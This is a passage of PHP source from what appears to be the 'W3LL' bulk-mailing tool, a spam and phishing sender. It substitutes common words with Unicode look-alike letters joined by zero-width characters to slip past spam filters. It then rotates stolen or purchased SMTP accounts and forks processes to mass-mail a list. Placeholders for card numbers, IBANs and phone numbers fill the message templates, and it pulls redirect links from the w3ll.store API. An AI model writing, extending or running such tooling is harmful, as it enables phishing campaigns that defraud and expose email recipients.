𝚖&#8205;𝚊&#8205;𝚒&#8205;𝚕&#8205;","_𝚜&#8205;𝚖&#8205;𝚝&#8205;𝚙&#8205;_𝚞&#8205;𝚜&#8205;𝚎&#8205;𝚛&#8205;","_𝚍&#8205;𝚘&#8205;𝚖&#8205;𝚊&#8205;𝚒&#8205;𝚗&#8205;2","𝚒&#8205;𝚗&#8205;", "𝚘&#8205;𝚛&#8205;", "𝚒&#8205;𝚝&#8205;", "𝚘&#8205;𝚞&#8205;𝚝&#8205;", "𝚐&#8205;𝚎&#8205;𝚝&#8205;", "𝚢&#8205;𝚘&#8205;u", "𝚒&#8205;𝚏&#8205;", "𝚊&#8205;", "𝙸&#8205;", "𝚊&#8205;𝚗&#8205;", "𝚊&#8205;𝚍&#8205;", "𝚏&#8205;𝚘&#8205;𝚗&#8205;𝚝&#8205;", "𝚜&#8205;𝚒&#8205;𝚣&#8205;𝚎&#8205;", "𝚊&#8205;𝚍&#8205;𝚍&#8205;","𝚘&#8205;𝚗&#8205;","𝚝&#8205;𝚘&#8205;","𝚒&#8205;𝚜&#8205;","𝚜&#8205;𝚘&#8205;","𝚋&#8205;","𝚍&#8205;𝚎&#8205;𝚛&#8205;","𝚝&#8205;𝚎&#8205;𝚡&#8205;𝚝&#8205;","𝚕&#8205;𝚒&#8205;𝚐&#8205;𝚗&#8205;","𝚙&#8205;𝚡&#8205;","𝚌&#8205;𝚘&#8205;𝚕&#8205;","𝚍&#8205;𝚎&#8205;𝚌&#8205;","𝚝&#8205;𝚒&#8205;","𝚗&#8205;","𝚎&#8205;","𝚌&#8205;𝚔&#8205;𝚐&#8205;𝚛&#8205;𝚘&#8205;𝚞&#8205;","𝚍&#8205;","𝚙&#8205;𝚕&#8205;","𝚢&#8205;","𝚕&#8205;","𝚘&#8205;𝚌&#8205;𝚔&#8205;","𝚜&#8205;e𝚌&#8205;");
            $rep = array("w3ll","_logo","_logo1","_data_company","_data_name","_data_phone","_data_secret_phone","_data_email","_data_ean","_data_upc","uid","_data_vat","_data_site","_data_fname","_data_lname","_data_postcode","_data_country","_data_state","_data_city","_data_addrs","_data_street","_data_cc","_data_expr","_data_ctype","_data_uname","_data_secret_uname","_data_staddrs","_data_iban","_data_freedomain","_data_isbn10","_data_sha1","_data_md5","_data_sha256","_data_ua","_domain_url","_smtp","_short64","_email64","_email","_subject","_randomip","_frommail","_fromname","_short","_randstring","_country","_date","_number1","_number2","_number3","_number4","_number5","_number6","_number7","_number8","_number9","_number10","_os","_browser","_time","_user","_domain","_domain1","_secret_email","_smtp_user","_domain2","in", "or", "it", "out", "get", "you", "if", "a", "I", "an", "ad", "font", "size", "add","on","to","is","so","b","der","text","lign","px","col","dec","ti","n","e","ckgrou","d","pl","y","l","ock","sec");

            $str1 = str_replace($exct, $rep, $strs);

            $W3LL_setup['msgfile'] = $str1;
        }
    }
    else{
        $W3LL_setup['msgfile'] = $filer;
    }

    /* END Reletter */

    /* Start variable */
    $ext = explode("\n", $file);
    $banner->start();

    $smtp_key = 0;
    $rat = $W3LL_setup['ratio'];
    $username = $W3LL_setup['username'];
    $password = $W3LL_setup['password'];
    $ids = $W3LL_setup['ids'];
    
    $extended = 0;
    $crot = 0;
    $redirect_count = 0;
    $crotmax = count($ext) - 1;
	date_default_timezone_set($W3LL_setup['timezone']);
    /* END */
    if($W3LL_setup['custom_name'] == true){
	    /* Name file */
	    $file="file/W3LL_MAILLIST/name.txt";
		$linecounts = 0;
		$handle = fopen($file, "r");
		while(!feof($handle)){
		  $line = fgets($handle);
		  $linecounts++;
		}
	}
	$cons = 0;
	$lname = '';
	$fname = '';

    foreach ($ext as $num => $email)
    {   
    	/* IF */
        if(count($smtp_acc) == 0){
            break;
        }

        if($linecounts == $cons){
        	$cons = 0;
        }

        if ($smtp_key == count($smtp_acc))
        {
            $smtp_key = 0;
        }

        if($redirect_count == 100)
        {
            $redirect_count = 0;
        }
        /* GET NAME */
        if($W3LL_setup['custom_name'] == true){
			$myFile = "file/W3LL_MAILLIST/name.txt";
			$lines = file($myFile);//file in to an array
			$names = $lines[$cons]; //line 2
			$names = explode("|", $names);

			$fname = $names[0];
			$lname = $names[1];

			$cons++;
		}

        /* REDIRECT ON */
        if($W3LL_setup['redirect'] == 9){
            if($redirect_count == 0){
                $ch = curl_init();

                curl_setopt($ch, CURLOPT_URL, "https://w3ll.store/api/generate_redirect?username=$username&password=$password&id=$ids");
                curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
                curl_setopt($ch, CURLOPT_CUSTOMREQUEST, 'GET');

                curl_setopt($ch, CURLOPT_ENCODING, 'gzip, deflate');

                $headers = array();
                $headers[] = 'Connection: keep-alive';
                $headers[] = 'Cache-Control: max-age=0';
                $headers[] = 'Upgrade-Insecure-Requests: 1';
                $headers[] = 'User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/86.0.4240.111 Safari/537.36';
                $headers[] = 'Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9';

                $result = curl_exec($ch);
                if (curl_errno($ch)) {
                    echo 'Error:' . curl_error($ch);
                }
                curl_close($ch);

                $obj = json_decode($result);
                $code = $obj->code;
            }
        }
        else{
            $code = '';
        }

        $ahh = $ext[$crot];
        $w3ll_setup['fromname'] = $ahh;
        $crot++;
        if ($crot >= $crotmax)
        {
            $crot = 0;
        }

        RandNumber(5);

        //Kirim
        $pid = pcntl_fork();

        //Anti looping
        if ($pid == - 1)
        {
            exit("Error forking...\n");
        }
        else if ($pid == 0)
        {
            if($W3LL_setup['email_test'] == 1)
            {
                if($extended == $W3LL_setup['test_every'])
                {
                    Kirim($W3LL_setup['email_destination'], $smtp_acc[$smtp_key], $W3LL_setup, $num, $banner, $redirect_count, $code, 1);
                }
            }
            Kirim($email, $smtp_acc[$smtp_key], $W3LL_setup, $num, $banner, $redirect_count, $code, 0, $fname, $lname);
            exit();
        }

        if($extended == $W3LL_setup['test_every'])
        {
            $extended = 0;
        }

        $dipake++;
        $smtp_key++;
        $redirect_count++;
        if ($W3LL_setup['userremoveline'] == 1)
        {
            unset($ext[$num]);
            Savedata($W3LL_setup['mail_list'], implode(PHP_EOL, $ext));
        }

        //Ratio
        $rat--;
        $extended++;
        if ($rat == 0)
        {
            if ($pid) {
                // we are the parent
                pcntl_wait($status); //Protect against Zombie children
            }
            sleep($W3LL_setup['sleeptime']-1);
            $rat = $W3LL_setup['ratio'];
            //$banner->delay($rat,$W3LL_setup);
        }

    }
    
    $banner->done();
}
?>

